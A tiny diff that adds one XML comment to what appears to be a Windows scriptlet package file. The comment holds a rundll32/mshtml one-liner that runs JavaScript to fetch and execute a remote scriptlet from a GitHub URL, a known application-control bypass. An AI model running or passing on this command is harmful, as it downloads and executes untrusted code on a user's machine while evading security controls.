@@ -1,3 +1,4 @@
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/eddiechu/eddiechu.github.io/main/rundll32.txt") -->
 <?xml version="1.0"?>
 
 <package>
